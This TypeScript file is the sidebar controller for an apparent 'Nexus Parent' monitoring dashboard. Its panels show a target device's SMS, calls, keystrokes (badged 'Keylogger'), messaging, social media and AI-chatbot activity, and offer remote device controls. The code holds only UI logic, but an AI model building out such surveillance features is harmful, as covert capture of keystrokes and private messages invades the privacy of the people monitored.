/**
 * @file right-sidebar.ts
 * @description Main controller & DOM renderer for Nexus Parent Right Sidebar.
 *
 * Hey friend! This coordinates the right-hand inspection & control panel:
 *  - Handles drag resizing of the left edge (width between 300px and 600px).
 *  - Renders the header with panel title, refresh action, and close button.
 *  - Mounts the active feature panel from its dedicated modular file in the sibling structure.
 *  - Strictly conforms to the pure Black & White design tokens.
 */

import { rightSidebarState } from './state.js';
import { sidebarState } from '../left-sidebar/state.js';
import type { RightSidebarPanelId, PanelConfig } from './types.js';
import { renderSmsPanel } from './sms/sms.js';
import { renderCallLogPanel } from './calllog/calllog.js';
import { renderNotificationPanel } from './notification/notification.js';
import { renderKeyboardPanel } from './keyboard/keyboard.js';
import { renderWhatsAppPanel } from './whatsapp/whatsapp.js';
import { renderTelegramPanel } from './telegram/telegram.js';
import { renderChatGptPanel } from './chatgpt/chatgpt.js';
import { renderClaudePanel } from './claude/claude.js';
import { renderGrokPanel } from './grok/grok.js';
import { renderChatsPanel } from './chats/chats.js';
import { renderGmailPanel } from './gmail/gmail.js';
import { renderFacebookPanel } from './facebook/facebook.js';
import { renderInstagramPanel } from './instagram/instagram.js';
import { renderSnapchatPanel } from './snapchat/snapchat.js';
import { renderWellbeingPanel } from './wellbeing/wellbeing.js';
import { renderAppLockPanel } from './applock/applock.js';
import { renderVibrateFlashPanel } from './vibrateflash/vibrateflash.js';
import { renderWallpaperPanel } from './wallpaper/wallpaper.js';

const PANEL_CONFIGS: Record<RightSidebarPanelId, PanelConfig> = {
  sms: { title: 'SMS Messages', badge: 'Active Sync', render: renderSmsPanel },
  calllog: { title: 'Call Log', badge: '5 Records', render: renderCallLogPanel },
  notification: { title: 'Notifications', badge: 'Live Stream', render: renderNotificationPanel },
  keyboard: { title: 'Keyboard Audit', badge: 'Keylogger', render: renderKeyboardPanel },
  whatsapp: { title: 'WhatsApp Activity', badge: 'Encrypted', render: renderWhatsAppPanel },
  telegram: { title: 'Telegram Activity', badge: 'Cloud Sync', render: renderTelegramPanel },
  chatgpt: { title: 'ChatGPT Activity', badge: 'AI Prompts', render: renderChatGptPanel },
  claude: { title: 'Claude Activity', badge: 'AI Prompts', render: renderClaudePanel },
  grok: { title: 'Grok Activity', badge: 'AI Prompts', render: renderGrokPanel },
  chats: { title: 'Chats Feed', badge: 'Unified', render: renderChatsPanel },
  gmail: { title: 'Gmail Monitor', badge: 'Syncing', render: renderGmailPanel },
  facebook: { title: 'Facebook Activity', badge: 'Social', render: renderFacebookPanel },
  instagram: { title: 'Instagram Activity', badge: 'Direct Msg', render: renderInstagramPanel },
  snapchat: { title: 'Snapchat Activity', badge: 'Ephemeral', render: renderSnapchatPanel },
  wellbeing: { title: 'Digital Wellbeing', badge: 'Today: 4h 40m', render: renderWellbeingPanel },
  applock: { title: 'App Lock Manager', badge: 'PIN Guard', render: renderAppLockPanel },
  vibrateflash: { title: 'Vibrate & Flash Device', badge: 'Hardware Link', render: renderVibrateFlashPanel },
  wallpaper: { title: 'Device Wallpaper', badge: 'Remote Display', render: renderWallpaperPanel }
};

/**
 * Initializes the Right Sidebar component, sets up resizing and listeners.
 */
export function initRightSidebar(): void {
  setupResizeHandle();

  // Re-render whenever active panel state changes
  rightSidebarState.subscribe(() => {
    renderRightSidebar();
  });

  // Initial render
  renderRightSidebar();
}

/**
 * Renders the right sidebar DOM contents according to current state.
 */
export function renderRightSidebar(): void {
  const sidebar = document.getElementById('right-sidebar');
  if (!sidebar) return;

  const isOpen = rightSidebarState.isOpen();
  const activePanelId = rightSidebarState.getActivePanelId();

  if (!isOpen || !activePanelId || !PANEL_CONFIGS[activePanelId]) {
    sidebar.classList.remove('open');
    sidebar.innerHTML = '';
    return;
  }

  const config = PANEL_CONFIGS[activePanelId];
  sidebar.classList.add('open');
  sidebar.style.width = `${rightSidebarState.getWidth()}px`;

  sidebar.innerHTML = `
    <!-- Left Edge Drag Resize Handle -->
    <div id="right-sidebar-resize-handle" class="right-sidebar-resize-handle" title="Drag to resize"></div>

    <!-- Panel Header -->
    <div class="rs-header">
      <div class="rs-header-left">
        <span class="rs-header-title">${config.title}</span>
      </div>
      <div class="rs-header-actions">
        <button id="btn-rs-close" class="rs-icon-btn close-btn" title="Close Panel">
          <img src="assets/icons/main-content/x.svg" alt="" />
        </button>
      </div>
    </div>

    <!-- Active Panel Body Host -->
    <div id="rs-body-host" style="flex:1; display:flex; flex-direction:column; overflow:hidden;"></div>

    <!-- Bottom Footer with Play/Pause Monitoring Button at bottom right -->
    <div class="rs-footer">
      <div class="rs-footer-left">
        <span id="rs-footer-status" class="rs-footer-status">Monitoring Paused</span>
      </div>
      <div class="rs-footer-right">
        <button id="btn-rs-play-pause" class="rs-play-btn" title="Start Monitoring">
          <img id="rs-play-icon" src="assets/icons/main-content/play.svg" alt="" />
        </button>
      </div>
    </div>

    <!-- Reusable Toast Notification Host -->
    <div id="rs-toast" class="rs-toast" style="display:none;">
      <span id="rs-toast-text"></span>
    </div>
  `;

  // Mount the modular panel body
  const bodyHost = sidebar.querySelector('#rs-body-host');
  if (bodyHost) {
    const panelBody = config.render();
    bodyHost.appendChild(panelBody);
  }

  // Attach Header Actions
  const closeBtn = sidebar.querySelector('#btn-rs-close');
  closeBtn?.addEventListener('click', () => {
    rightSidebarState.close();
  });

  // Wire Play/Pause monitoring button at bottom right
  const playBtn = sidebar.querySelector<HTMLButtonElement>('#btn-rs-play-pause');
  const playIcon = sidebar.querySelector<HTMLImageElement>('#rs-play-icon');
  const statusSpan = sidebar.querySelector<HTMLElement>('#rs-footer-status');

  const updatePlayState = (live: boolean) => {
    if (live) {
      playBtn?.classList.add('active');
      playBtn?.setAttribute('title', 'Pause Monitoring');
      if (playIcon) playIcon.src = 'assets/icons/main-content/pause.svg';
      if (statusSpan) {
        statusSpan.innerHTML = '<span class="status-live-dot"></span><span>Live Monitoring</span>';
        statusSpan.classList.add('live');
      }
    } else {
      playBtn?.classList.remove('active');
      playBtn?.setAttribute('title', 'Start Monitoring');
      if (playIcon) playIcon.src = 'assets/icons/main-content/play.svg';
      if (statusSpan) {
        statusSpan.textContent = 'Monitoring Paused';
        statusSpan.classList.remove('live');
      }
    }
  };

  // Initially in paused state until user plays
  const isLive = sidebarState.isFeatureLive(activePanelId);
  updatePlayState(isLive);

  playBtn?.addEventListener('click', () => {
    const nextLive = !sidebarState.isFeatureLive(activePanelId);
    sidebarState.setFeatureLive(activePanelId, nextLive);
    updatePlayState(nextLive);
  });
}

/**
 * Connects the drag handle on the left edge allowing custom panel width (300px - 600px).
 */
function setupResizeHandle(): void {
  const sidebar = document.getElementById('right-sidebar');
  if (!sidebar) return;

  let isResizing = false;
  let startX = 0;
  let startWidth = 380;

  sidebar.addEventListener('mousedown', (e) => {
    const target = e.target as HTMLElement | null;
    if (target?.id === 'right-sidebar-resize-handle') {
      isResizing = true;
      startX = e.clientX;
      startWidth = sidebar.getBoundingClientRect().width;
      target.classList.add('resizing');
      document.body.style.cursor = 'ew-resize';
      e.preventDefault();
    }
  });

  window.addEventListener('mousemove', (e) => {
    if (!isResizing) return;
    const delta = startX - e.clientX;
    const newWidth = Math.max(300, Math.min(600, startWidth + delta));
    sidebar.style.width = `${newWidth}px`;
    rightSidebarState.setWidth(newWidth);
  });

  window.addEventListener('mouseup', () => {
    if (isResizing) {
      isResizing = false;
      const handle = document.getElementById('right-sidebar-resize-handle');
      handle?.classList.remove('resizing');
      document.body.style.cursor = '';
    }
  });
}
